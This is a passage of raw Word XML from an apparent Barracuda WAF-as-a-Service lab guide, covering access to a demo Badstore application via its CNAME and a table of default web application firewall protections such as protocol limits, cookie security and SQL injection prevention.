        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t>for our application</w:t>
      </w:r>
      <w:r w:rsidR="4276AB62">
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t>shown</w:t>
      </w:r>
      <w:r w:rsidR="41CF892D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80">
        <w:t xml:space="preserve">under </w:t>
      </w:r>
      <w:r w:rsidR="406CDF80" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="0027594A">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B7D8938" wp14:editId="55A53CDD">
            <wp:extent cx="5316934" cy="457994"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851366" name="Picture 144985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6934" cy="457994"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3DAF6B" w14:textId="1606ABA6" w:rsidR="00354529" w:rsidRPr="00354529" w:rsidRDefault="00354529" w:rsidP="00354529">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00354529">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Wait </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>up to</w:t>
      </w:r>
      <w:r w:rsidRPr="00354529">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> 5 minutes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093BE5D9" w14:textId="77777777" w:rsidR="0015168C" w:rsidRDefault="0015168C" w:rsidP="0015168C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="00662E89">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, for example </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12FEDE6E" w14:textId="12507306" w:rsidR="2CB00A22" w:rsidRDefault="0015168C" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Y</w:t>
      </w:r>
      <w:r w:rsidR="0027594A">
        <w:t xml:space="preserve">ou should see the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0027594A">
        <w:t>Badstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0027594A">
        <w:t xml:space="preserve"> application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6771A25E" w14:textId="03FB06ED" w:rsidR="50C40F79" w:rsidRDefault="005A1E1A" w:rsidP="005A1E1A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="679C8BDC" wp14:editId="3ED7D317">
            <wp:extent cx="3209925" cy="16564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3209925" cy="1656404"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EEA6CAD" w14:textId="6754DFA4" w:rsidR="00D51572" w:rsidRDefault="00D51572" w:rsidP="00D51572">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Please note it may take up to 5 minutes for the CNAME to be </w:t>
      </w:r>
      <w:r w:rsidR="0078663B">
        <w:t>ready, so if it does not work, please wait a few minutes then try again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5045614D" w14:textId="77777777" w:rsidR="00D51572" w:rsidRDefault="00D51572" w:rsidP="005A1E1A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C1246CE" w14:textId="77777777" w:rsidR="00354529" w:rsidRDefault="00354529">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc2463865"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED0D5BF" w14:textId="18F3CD28" w:rsidR="008A0072" w:rsidRDefault="008A0072" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc72791968"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Configuring the Application Security Policy</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="353B23BF" w14:textId="0C4A05E5" w:rsidR="0AB6FA65" w:rsidRDefault="2CB00A22" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc72791969"/>
      <w:r>
        <w:t>Default Security</w:t>
      </w:r>
      <w:r w:rsidR="53BB5D5B">
        <w:t xml:space="preserve"> Posture</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="0FBA247D" w14:textId="3105BB8E" w:rsidR="00BA2C80" w:rsidRDefault="268FBCBA" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="142DB374">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="7B853F91">
        <w:t xml:space="preserve">deployment starts with </w:t>
      </w:r>
      <w:r w:rsidR="0F3F465D">
        <w:t>reasonable</w:t>
      </w:r>
      <w:r w:rsidR="7B853F91">
        <w:t xml:space="preserve"> default </w:t>
      </w:r>
      <w:r w:rsidR="41704F57">
        <w:t xml:space="preserve">security </w:t>
      </w:r>
      <w:r w:rsidR="03F77F9D">
        <w:t>settings</w:t>
      </w:r>
      <w:r w:rsidR="4355A7D9">
        <w:t xml:space="preserve">, which together </w:t>
      </w:r>
      <w:r w:rsidR="1EFEEA09">
        <w:t>becom</w:t>
      </w:r>
      <w:r w:rsidR="4355A7D9">
        <w:t xml:space="preserve">e the out-of-the-box security posture for a new </w:t>
      </w:r>
      <w:r w:rsidR="3FCBB274">
        <w:t>application.</w:t>
      </w:r>
      <w:r w:rsidR="00BA2C80">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="3CD2C06B">
        <w:t>Th</w:t>
      </w:r>
      <w:r w:rsidR="216AA545">
        <w:t>ese</w:t>
      </w:r>
      <w:r w:rsidR="3CD2C06B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="624FE1D5">
        <w:t xml:space="preserve">settings </w:t>
      </w:r>
      <w:r w:rsidR="63ECEFC1">
        <w:t xml:space="preserve">may be </w:t>
      </w:r>
      <w:r w:rsidR="2D124FDE">
        <w:t>tun</w:t>
      </w:r>
      <w:r w:rsidR="63ECEFC1">
        <w:t>ed</w:t>
      </w:r>
      <w:ins w:id="29" w:author="Tushar Richabadas" w:date="2021-05-07T11:12:00Z">
        <w:r w:rsidR="62665C52">
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="63ECEFC1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="627F3446">
        <w:t xml:space="preserve">either </w:t>
      </w:r>
      <w:r w:rsidR="4280F1F7">
        <w:t xml:space="preserve">broadly for the whole application, or in a </w:t>
      </w:r>
      <w:r w:rsidR="508E035B">
        <w:t xml:space="preserve">very </w:t>
      </w:r>
      <w:r w:rsidR="4280F1F7">
        <w:t>fine-grained manne</w:t>
      </w:r>
      <w:r w:rsidR="04492A5C">
        <w:t>r for certain URLs and Parameters.</w:t>
      </w:r>
      <w:r w:rsidR="00BA2C80">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDEE175" w14:textId="0FBE39C0" w:rsidR="00F90E1A" w:rsidRDefault="0DAFFDA6" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">The following table shows </w:t>
      </w:r>
      <w:r w:rsidR="59935C22">
        <w:t>the corresponding WAF-as-a-Service component</w:t>
      </w:r>
      <w:r w:rsidR="505B60D2">
        <w:t xml:space="preserve"> to tune each default setting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45962CBD" w14:textId="77777777" w:rsidR="00BB5FA4" w:rsidRDefault="00354529" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>You do not have to do any steps here</w:t>
      </w:r>
      <w:r w:rsidR="00BA2C80">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6240E0" w14:textId="151AF0D7" w:rsidR="00354529" w:rsidRDefault="00354529" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Proceed to the next step</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9491" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="06A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="1" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1965"/>
        <w:gridCol w:w="3810"/>
        <w:gridCol w:w="945"/>
        <w:gridCol w:w="2771"/>
      </w:tblGrid>
      <w:tr w:rsidR="10B611DA" w14:paraId="3E105ACA" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E8BCD"/>
          </w:tcPr>
          <w:p w14:paraId="5D4E9F14" w14:textId="28ECB696" w:rsidR="0539EBDB" w:rsidRDefault="402A5756" w:rsidP="55E0BB2E">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="55E0BB2E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Mechanism</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E8BCD"/>
          </w:tcPr>
          <w:p w14:paraId="77FC266F" w14:textId="66F1218E" w:rsidR="611414C3" w:rsidRDefault="3EF956DD" w:rsidP="55E0BB2E">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="55E0BB2E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E8BCD"/>
          </w:tcPr>
          <w:p w14:paraId="4E6835C0" w14:textId="64D1EBDD" w:rsidR="53B42CFD" w:rsidRDefault="19A624D6" w:rsidP="55E0BB2E">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="55E0BB2E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">Default </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E8BCD"/>
          </w:tcPr>
          <w:p w14:paraId="67695083" w14:textId="1B1B541E" w:rsidR="316EBCD8" w:rsidRDefault="4DEA9A18" w:rsidP="55E0BB2E">
            <w:pPr>
              <w:pStyle w:val="NoSpacing"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="55E0BB2E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>WAF-as-a-Service</w:t>
            </w:r>
            <w:r w:rsidR="22A48795" w:rsidRPr="55E0BB2E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="7973E69B" w:rsidRPr="55E0BB2E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Component</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="15ABD0D9" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5D4346EF" w14:textId="3F83E8F6" w:rsidR="26196F68" w:rsidRPr="00BB5FA4" w:rsidRDefault="3F941B4E" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:color w:val="333333"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
              <w:t>Check Protocol Limits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C57098A" w14:textId="0F3DEF4B" w:rsidR="61297E3B" w:rsidRPr="00BB5FA4" w:rsidRDefault="748CFAD4" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Check size limit on various HTTP protocol elements like request length, header length etc. These checks prevent a wide class of possible Buffer Overflow attacks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="47F1EAD2" w14:textId="39B43FE0" w:rsidR="0995B1C2" w:rsidRPr="00BB5FA4" w:rsidRDefault="625A0A32" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Yes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79A48BE1" w14:textId="0FDB470A" w:rsidR="1E3A7489" w:rsidRPr="00BB5FA4" w:rsidRDefault="3B6419D6" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="046C4629" w14:textId="6B25FC45" w:rsidR="1E3A7489" w:rsidRPr="00BB5FA4" w:rsidRDefault="3B6419D6" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="31F0552B">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Parameter </w:t>
            </w:r>
            <w:commentRangeStart w:id="30"/>
            <w:r w:rsidRPr="31F0552B">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Protection</w:t>
            </w:r>
            <w:commentRangeEnd w:id="30"/>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="CommentReference"/>
              </w:rPr>
              <w:commentReference w:id="30"/>
            </w:r>
          </w:p>
          <w:p w14:paraId="19C46497" w14:textId="396D362D" w:rsidR="397356EB" w:rsidRPr="00BB5FA4" w:rsidRDefault="05594334" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>App Profiles</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="016EB756" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B3807D5" w14:textId="6C308F07" w:rsidR="1081B29B" w:rsidRPr="00BB5FA4" w:rsidRDefault="15468CD9" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Cookie Security Mode</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76409582" w14:textId="4B64D8FD" w:rsidR="1081B29B" w:rsidRPr="00BB5FA4" w:rsidRDefault="15468CD9" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Encrypted makes all cookies un-readable by the client browser. Signed makes cookies visible but attaches a signature to prevent tampering.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B6A171D" w14:textId="6D116C1D" w:rsidR="1081B29B" w:rsidRPr="00BB5FA4" w:rsidRDefault="00FD0844" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Off</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2F9A8F15" w14:textId="571904E2" w:rsidR="3DF06418" w:rsidRPr="00BB5FA4" w:rsidRDefault="5BC9ED80" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Cookie Security</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="010C982C" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18DF3BEC" w14:textId="655ACA54" w:rsidR="3DF06418" w:rsidRPr="00BB5FA4" w:rsidRDefault="5BC9ED80" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Protection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64134915" w14:textId="603B6F23" w:rsidR="3DF06418" w:rsidRPr="00BB5FA4" w:rsidRDefault="5BC9ED80" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Enables protection on a URL. These settings are ignored when URL Profiles are used for validating the incoming requests.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="669E064F" w14:textId="345EADEF" w:rsidR="3DF06418" w:rsidRPr="00BB5FA4" w:rsidRDefault="5BC9ED80" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Yes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41B660D2" w14:textId="4FE74894" w:rsidR="2DC3F324" w:rsidRPr="00BB5FA4" w:rsidRDefault="56565FEA" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Protection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="64D792C9" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="171A6AD8" w14:textId="483236D8" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Parameter Protection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="31D35186" w14:textId="75EC92C3" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Enables protection on request parameters by enforcing limits on various sizes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3EB4F921" w14:textId="19605660" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Yes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="29A5C80E" w14:textId="5B0F60DC" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Parameter Protection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="2966679A" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="34A56125" w14:textId="089CF225" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>SQL Injection Prevention</w:t>
            </w:r>
